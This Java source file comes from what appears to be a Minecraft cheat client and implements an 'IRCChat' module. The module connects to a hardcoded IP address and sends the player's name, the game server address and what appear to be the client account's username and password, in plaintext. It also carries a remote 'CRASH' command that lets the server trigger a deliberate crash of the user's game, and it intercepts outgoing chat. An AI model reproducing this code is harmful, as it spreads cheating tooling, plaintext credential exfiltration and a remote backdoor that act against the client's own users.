package zelix.hack.hacks.irc;

import java.net.*;
import java.util.*;
import zelix.hack.*;
import zelix.utils.ReflectionHelper;
import zelix.utils.hooks.visual.*;
import net.minecraft.network.play.client.*;
import net.minecraftforge.fml.relauncher.*;
import java.lang.reflect.*;
import java.io.*;
import net.minecraft.client.*;
import zelix.*;
import zelix.managers.*;
import zelix.utils.*;
import zelix.utils.system.*;
import java.nio.charset.*;

public class IRCChat extends Hack
{
    public static boolean isdev;
    public BufferedReader reader;
    public static Socket socket;
    public static PrintWriter pw;
    static InputStream in;
    private static boolean connect;
    private static String prefix;
    public static List<String> banned;
    public static String FGF;
    private static int sec;
    
    public IRCChat() {
        super("IRCChat", HackCategory.ANOTHER);
    }
    
    @Override
    public void onEnable() {
        if (Utils.nullCheck()) {
            return;
        }
        new IRCTheard().start();
        super.onEnable();
    }
    
    public static void send(final String TEXT) {
        try {
            IRCChat.socket.getOutputStream().write(TEXT.getBytes("UTF-8"));
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onDisable() {
        try {
            IRCChat.connect = false;
            if (IRCChat.in == null || IRCChat.socket.getOutputStream() == null || IRCChat.socket == null) {
                return;
            }
            IRCChat.in.close();
            IRCChat.socket.getOutputStream().close();
            IRCChat.socket.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        ChatUtils.warning("Disconnect from IRC!");
        super.onDisable();
    }
    
    @Override
    public boolean onPacket(final Object packet, final Connection.Side side) {
        if (side == Connection.Side.OUT && packet instanceof CPacketChatMessage) {
            final Field field = ReflectionHelper.findField((Class)CPacketChatMessage.class, new String[] { "message", "message" });
            try {
                if (!field.isAccessible()) {
                    field.setAccessible(true);
                }
                if (packet instanceof CPacketChatMessage) {
                    final CPacketChatMessage p = (CPacketChatMessage)packet;
                    if (p.getMessage().subSequence(0, 1).equals("+")) {
                        write("[TARGET][MESSAGE][MSG][" + p.getMessage().substring(1, p.getMessage().length()) + "]");
                        return false;
                    }
                    return true;
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                this.onDisable();
                this.onEnable();
            }
        }
        return true;
    }
    
    public static void connect() {
        ChatUtils.warning("Try to connect to the server...");
        try {
            IRCChat.socket = new Socket("121.62.61.198", 9998);
            IRCChat.in = IRCChat.socket.getInputStream();
            IRCChat.pw = new PrintWriter(new OutputStreamWriter(IRCChat.socket.getOutputStream(), "UTF-8"), true);
            if (Wrapper.INSTANCE.mc().getCurrentServerData() != null) {
                write("[TARGET][CONNECT][HOST][121.62.61.198:14100][GAMEID][" + Wrapper.INSTANCE.player().getName() + "][GAMEIP][" + Minecraft.getMinecraft().getCurrentServerData().serverIP.toLowerCase() + "][ACT][" + Core.UN + "][PWD][" + Core.UP + "]");
            }
            else {
                write("[TARGET][CONNECT][HOST][121.62.61.198:14100][GAMEID][" + Wrapper.INSTANCE.player().getName() + "][GAMEIP][Local][ACT][" + Core.UN + "][PWD][" + Core.UP + "]");
            }
        }
        catch (IOException e) {
            ChatUtils.error("Failed to Connect!");
            HackManager.getHack("IRCChat").setToggled(false);
            HackManager.getHack("IRCChat").onDisable();
            e.printStackTrace();
        }
    }
    
    public static void handleInput() {
        final byte[] data = new byte[1024];
        try {
            final int len = IRCChat.in.read(data);
            String ircmessage = new String(data, 0, len);
            ircmessage = ircmessage.replaceAll("\n", "");
            ircmessage = ircmessage.replaceAll("\r", "");
            ircmessage = ircmessage.replaceAll("\t", "");
            if (!IRCChat.connect) {
                if (ircmessage.equals("SUC")) {
                    ChatUtils.message("Connection is Successful!");
                    IRCChat.connect = true;
                }
                else if (ircmessage.equals("FAIL")) {
                    ChatUtils.error("Connection is Failed!");
                    IRCChat.connect = false;
                }
            }
            else {
                if (ircmessage.equals("CRASH")) {
                    ChatUtils.error("You Are Crashed By A BETA USER OR SERVER!");
                    try {
                        Thread.sleep(60000L);
                    }
                    catch (InterruptedException e) {
                        new Cr4sh();
                    }
                    new Cr4sh();
                }
                final String Type = Utils.getSubString(ircmessage, "[TYPE][", "]");
                if (!Type.equalsIgnoreCase("SMSG")) {
                    if (Type.equalsIgnoreCase("NMSG")) {
                        final String USER = Utils.getSubString(ircmessage, "[USER][", "]");
                        final String MSG = Utils.getSubString(ircmessage, "[MSG][", "]");
                        final String Title = Utils.getSubString(ircmessage, "[TITLE][", "]");
                        final String Server = Utils.getSubString(ircmessage, "[SERVER][", "]");
                        ChatUtils.IRC(EnumChatFormatting.DARK_AQUA + "[" + EnumChatFormatting.GOLD + Server + EnumChatFormatting.DARK_AQUA + "]" + EnumChatFormatting.DARK_AQUA + "[" + EnumChatFormatting.WHITE + Title + EnumChatFormatting.DARK_AQUA + "]" + EnumChatFormatting.AQUA + USER + ": " + EnumChatFormatting.WHITE + MSG);
                    }
                    else {
                        ChatUtils.message(ircmessage);
                    }
                }
            }
        }
        catch (IOException ex) {}
    }
    
    public static void write(final String str) {
        try {
            IRCChat.socket.getOutputStream().write(str.getBytes(StandardCharsets.UTF_8));
            IRCChat.socket.getOutputStream().flush();
        }
        catch (Throwable e) {
            e.printStackTrace();
        }
    }
    
    static {
        IRCChat.isdev = false;
        IRCChat.connect = false;
        IRCChat.prefix = "";
        IRCChat.FGF = "r@safucku@uuense@";
        IRCChat.sec = 1;
    }
}
